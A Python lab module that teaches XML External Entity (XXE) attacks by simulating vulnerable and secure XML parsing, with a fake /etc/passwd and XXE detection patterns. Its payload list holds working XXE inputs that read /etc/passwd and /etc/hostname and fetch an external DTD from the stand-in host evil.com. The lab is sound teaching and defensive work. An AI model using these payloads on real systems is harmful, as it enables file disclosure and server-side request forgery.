"""
XML External Entity (XXE) Lab

Learn about XXE vulnerabilities and secure XML parsing.

This lab demonstrates how attackers exploit insecure XML parsing
to read files or perform SSRF attacks.

DISCLAIMER: This lab is for educational purposes only.
Never exploit XXE without authorization.
"""

DIFFICULTY = "Advanced"

OBJECTIVES = [
    "Understand what XXE is",
    "Learn how XXE attacks work",
    "Identify vulnerable XML parsers",
    "Practice secure XML parsing"
]



# Simulated sensitive files
SENSITIVE_FILES = {
    "/etc/passwd": "root:x:0:0:root:/root:/bin/bash\nadmin:x:1000:1000:admin:/home/admin:/bin/sh",
    "/etc/hostname": "cyberlab-server",
}


def vulnerable_xml_parse(xml_data: str) -> dict:
    """Simulate vulnerable XML parsing.
    
    Args:
        xml_data: XML data to parse
        
    Returns:
        dict: Parse result
    """
    # Check for XXE patterns
    xxe_patterns = [
        "<!ENTITY",
        "SYSTEM",
        "PUBLIC",
        "file://",
        "http://",
    ]
    
    has_xxe = any(pattern in xml_data for pattern in xxe_patterns)
    
    if has_xxe:
        # Simulate XXE attack
        if "file:///etc/passwd" in xml_data or "file:///etc/passwd" in xml_data:
            return {
                "success": True,
                "xxe_detected": True,
                "result": SENSITIVE_FILES.get("/etc/passwd", "File not accessible"),
                "attack_type": "File disclosure"
            }
        
        if "file:///etc/hostname" in xml_data:
            return {
                "success": True,
                "xxe_detected": True,
                "result": SENSITIVE_FILES.get("/etc/hostname", "File not accessible"),
                "attack_type": "File disclosure"
            }
        
        return {
            "success": True,
            "xxe_detected": True,
            "result": "XXE payload executed!",
            "attack_type": "XXE injection"
        }
    
    # Normal XML parsing
    if "<user>" in xml_data:
        return {
            "success": True,
            "xxe_detected": False,
            "result": "User: John Doe",
            "attack_type": None
        }
    
    return {
        "success": True,
        "xxe_detected": False,
        "result": "XML parsed successfully",
        "attack_type": None
    }


def secure_xml_parse(xml_data: str) -> dict:
    """Simulate secure XML parsing with XXE protection.
    
    Args:
        xml_data: XML data to parse
        
    Returns:
        dict: Parse result
    """
    # Secure: Disable external entities
    xxe_patterns = ["<!ENTITY", "SYSTEM", "PUBLIC"]
    
    if any(pattern in xml_data for pattern in xxe_patterns):
        return {
            "success": False,
            "xxe_detected": False,
            "error": "XXE attack blocked! External entities are disabled.",
            "protected": True
        }
    
    # Safe XML parsing
    if "<user>" in xml_data:
        return {
            "success": True,
            "xxe_detected": False,
            "result": "User: John Doe",
            "protected": True
        }
    
    return {
        "success": True,
        "xxe_detected": False,
        "result": "XML parsed successfully",
        "protected": True
    }


def detect_xxe(xml_data: str) -> bool:
    """Detect potential XXE in XML.
    
    Args:
        xml_data: XML data to check
        
    Returns:
        bool: True if XXE detected
    """
    xxe_patterns = ["<!ENTITY", "SYSTEM", "PUBLIC"]
    return any(pattern in xml_data for pattern in xxe_patterns)


def run(*args):
    """Run the XXE Lab."""
    print("=" * 50)
    print("   XML EXTERNAL ENTITY (XXE) LAB")
    print("=" * 50)
    print()
    print("OBJECTIVES:")
    for i, obj in enumerate(OBJECTIVES, 1):
        print(f"  {i}. {obj}")
    print()
    print("-" * 50)
    print()
    
    print("SCENARIO:")
    print("  An XML parser that processes user-submitted XML")
    print("  without disabling external entities.")
    print()
    
    print("-" * 50)
    print()
    
    print("OPTIONS:")
    print("  1. Vulnerable XML parsing")
    print("  2. Secure XML parsing")
    print("  3. Test payloads")
    print()
    
    choice = input("Choose (1-3): ")
    
    if choice == "1":
        print("\n--- Vulnerable XML Parsing ---")
        print("Vulnerable code:")
        print("  parser = ET.XMLParser(resolve_entities=True)")
        print("  tree = ET.fromstring(xml_data, parser=parser)")
        print()
        
        print("Normal XML:")
        print('  <?xml version="1.0"?><user>John</user>')
        print()
        
        xml = input("Enter XML: ")
        
        result = vulnerable_xml_parse(xml)
        
        print(f"\nResult: {result['result']}")
        if result.get("xxe_detected"):
            print(f"Attack type: {result.get('attack_type', 'XXE')}")
            print("\n⚠️  XXE VULNERABILITY EXPLOITED!")
            
    elif choice == "2":
        print("\n--- Secure XML Parsing ---")
        print("Secure code:")
        print("  parser = ET.XMLParser(resolve_entities=False)")
        print("  # Or use defusedxml library")
        print()
        
        xml = input("Enter XML: ")
        
        result = secure_xml_parse(xml)
        
        if result["success"]:
            print(f"\nResult: {result['result']}")
        else:
            print(f"\n✗ {result['error']}")
            
    elif choice == "3":
        print("\n--- XXE Payloads ---")
        
        payloads = [
            ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><user>&xxe;</user>', "File disclosure"),
            ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><user>&xxe;</user>', "File disclosure"),
            ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/evil.dtd">]><user>&xxe;</user>', "SSRF"),
            ('<?xml version="1.0"?><!ENTITY % dtd SYSTEM "http://evil.com/evil.dtd">%dtd;', "SSRF"),
            ('<?xml version="1.0"?><user>Normal</user>', "Normal"),
        ]
        
        print("\nXXE Payloads:")
        for i, (payload, desc) in enumerate(payloads, 1):
            detected = "✓" if detect_xxe(payload) else "✗"
            print(f"  {i}. {detected} {desc}")
            print(f"     {payload[:60]}...")
        
    else:
        print("Invalid choice.")
        return False
    
    print()
    print("-" * 50)
    print()
    print("KEY TAKEAWAYS:")
    print("  - Disable external entities in XML parsers")
    print("  - Use safe XML libraries (defusedxml)")
    print("  - Validate and sanitize XML input")
    print("  - Use JSON instead of XML when possible")
    print("  - Keep parsers updated")
    print("  - Use allowlists for external resources")
    
    print()
    print("XXE ATTACKS:")
    print("  - Read local files")
    print("  - Server-Side Request Forgery (SSRF)")
    print("  - Denial of Service")
    print("  - Port scanning internal network")
    
    print()
    print("-" * 50)
    print("Lab completed.")
    return True


if __name__ == "__main__":
    run()
